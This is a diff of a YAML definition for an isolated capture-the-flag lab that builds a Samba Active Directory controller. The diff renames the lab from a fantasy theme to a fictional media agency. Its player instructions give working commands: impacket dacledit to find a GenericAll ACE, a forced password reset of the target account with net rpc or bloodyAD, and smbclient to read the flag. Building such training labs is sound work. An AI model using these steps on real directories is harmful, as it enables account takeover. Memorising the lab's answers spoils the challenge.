@@ -1,25 +1,25 @@
 # yaml-language-server: $schema=https://www.isoloom.com/schema/v1.json
-# AD ACL abuse (GOAD-themed) as a single-container Isoloom lab: one Samba Active Directory
-# Domain Controller for NORTH.SEVENKINGDOMS.LOCAL, no Windows VMs. It provisions a low-privilege
-# foothold user (hodor) that holds GenericAll over a higher-value account (maester.luwin), a
-# bystander (jon.snow) with no such control, and an archive share only maester.luwin may read.
-# The student finds the control edge, abuses GenericAll to reset maester.luwin's password, then
-# authenticates as maester.luwin and reads the flag. `isoloom generate`, then
-# `isothrum up . --target docker`.
+# AD ACL abuse (Vertex Media Group scenario) as a single-container Isoloom lab: one Samba Active
+# Directory Domain Controller for VERTEX.LAB, no Windows VMs. It provisions a low-privilege
+# foothold user (d.laurent, a content editor) that holds GenericAll over a higher-value account
+# (b.whitfield, the archivist), a bystander (n.castellano) with no such control, and an archive
+# share only b.whitfield may read. The student finds the control edge, abuses GenericAll to reset
+# b.whitfield's password, then authenticates as b.whitfield and reads the flag. `isoloom generate`,
+# then `isothrum up . --target docker`.
 version: 1
 
-name: acl-abuse-north
+name: acl-abuse-vertex
 
 # Given by the CyberCTF launcher: this player's flag. Without it the development flag.
 inputs: [CTF_FLAG_MAIN]
 
 networks:
-  lab: { cidr: 10.61.14.0/24, internet: false }
+  lab: { cidr: 10.60.10.0/24, internet: false }
 
 machines:
   dc:
     networks: { lab: 10 }
-    aliases: [dc.north.sevenkingdoms.local, north.sevenkingdoms.local]
+    aliases: [dc.vertex.lab, vertex.lab]
     resources: { cpus: 2, memory_mb: 2048 }
     ports:
       dns:         { port: 53,   protocol: tcp }
@@ -33,7 +33,7 @@ machines:
       ldaps:       { port: 636,  protocol: tls }
       gc:          { port: 3268, protocol: tcp }
     # The flag arrives as a file before the DC starts (Isoloom's sensitive-input mechanism);
-    # provisioning copies it into the archive that only maester.luwin may read.
+    # provisioning copies it into the archive that only b.whitfield may read.
     files:
       - { path: /ctf/flag, input: CTF_FLAG_MAIN, mode: "0444" }
     app:
@@ -43,43 +43,44 @@ checks:
   - { name: the KDC answers, tcp: dc:88, wait: 120 }
   - { name: LDAP answers, tcp: dc:389, wait: 120 }
   - { name: SMB answers, tcp: dc:445, wait: 120 }
-  # End-to-end ACL abuse, driven from inside the DC: hodor's GenericAll over maester.luwin is
-  # confirmed, a bystander is shown to be denied, hodor resets maester.luwin's password through
+  # End-to-end ACL abuse, driven from inside the DC: d.laurent's GenericAll over b.whitfield is
+  # confirmed, a bystander is shown to be denied, d.laurent resets b.whitfield's password through
   # the ACE, and that password reads the flag. Passes only when the control path genuinely holds;
   # the heavy step is gated behind the ports.
-  - name: GenericAll over maester.luwin resets its password and unlocks the flag
+  - name: GenericAll over b.whitfield resets its password and unlocks the flag
     from: dc
     exec: /opt/aclabuse/check.sh
     expect: ACLABUSE_OK
     wait: 180
 
 message: |
-  # AD ACL abuse — NORTH.SEVENKINGDOMS.LOCAL
+  # AD ACL abuse — Vertex Media Group (VERTEX.LAB)
 
-  A lone Active Directory Domain Controller (Samba) runs the realm **NORTH.SEVENKINGDOMS.LOCAL**:
+  **Vertex Media Group**, a media and marketing agency, runs its directory on a single Active
+  Directory domain controller (Samba) for the realm **VERTEX.LAB**:
 
-  - **DC:** `dc.north.sevenkingdoms.local` at `{{ machines.dc.addresses.lab }}` (KDC 88, LDAP 389/636, SMB 445).
-  - **Your foothold (a normal domain user):** `hodor` / `Hodor123!`
+  - **DC:** `dc.vertex.lab` at `{{ machines.dc.addresses.lab }}` (KDC 88, LDAP 389/636, SMB 445).
+  - **Your foothold (a content editor's domain account):** `d.laurent` / `Editor!2024`
 
-  **Objective:** your foothold account was over-permissioned. Somewhere in the directory, `hodor`
-  holds a dangerous access-control entry — **GenericAll** — over a higher-value account. Full
-  control over a user object includes the right to reset its password *without knowing the old
-  one*. Find the control edge, seize the target account, and use it to read a flag from a share
-  `hodor` cannot open.
+  **Objective:** your foothold account was over-permissioned. Somewhere in the directory,
+  `d.laurent` holds a dangerous access-control entry — **GenericAll** — over a higher-value
+  account. Full control over a user object includes the right to reset its password *without
+  knowing the old one*. Find the control edge, seize the target account, and use it to read a
+  flag from a share `d.laurent` cannot open.
 
   Point your attack box's resolver and `/etc/krb5.conf` at the DC, then:
 
   1. **Find the control edge.** Read the DACL of candidate principals and look for an ACE that
-     grants `hodor` GenericAll / full control. For example with impacket:
-     `dacledit.py -action read -principal hodor -target-dn '<target DN>' -dc-ip {{ machines.dc.addresses.lab }} 'NORTH/hodor:Hodor123!'`
+     grants `d.laurent` GenericAll / full control. For example with impacket:
+     `dacledit.py -action read -principal d.laurent -target-dn '<target DN>' -dc-ip {{ machines.dc.addresses.lab }} 'VERTEX/d.laurent:Editor!2024'`
      (BloodHound's `GenericAll` edge or `samba-tool dsacl get` show the same thing.) → the target
-     is **`maester.luwin`**.
+     is **`b.whitfield`**.
   2. **Abuse GenericAll — targeted password reset.** With full control you can force a new
-     password on `maester.luwin` (no current password required):
-     `net rpc password maester.luwin 'NewPassw0rd!' -U 'NORTH\hodor%Hodor123!' -S dc.north.sevenkingdoms.local`
-     (or `bloodyAD ... set password maester.luwin 'NewPassw0rd!'` over LDAPS).
-  3. **Become the target.** You now own `maester.luwin`'s credentials.
+     password on `b.whitfield` (no current password required):
+     `net rpc password b.whitfield 'NewPassw0rd!' -U 'VERTEX\d.laurent%Editor!2024' -S dc.vertex.lab`
+     (or `bloodyAD ... set password b.whitfield 'NewPassw0rd!'` over LDAPS).
+  3. **Become the target.** You now own `b.whitfield`'s credentials.
   4. **Loot the flag:**
-     `smbclient //dc/archive -U 'NORTH\maester.luwin%NewPassw0rd!' -c 'get flag.txt'`.
+     `smbclient //dc/archive -U 'VERTEX\b.whitfield%NewPassw0rd!' -c 'get flag.txt'`.
 
   Submit the contents of `flag.txt`.
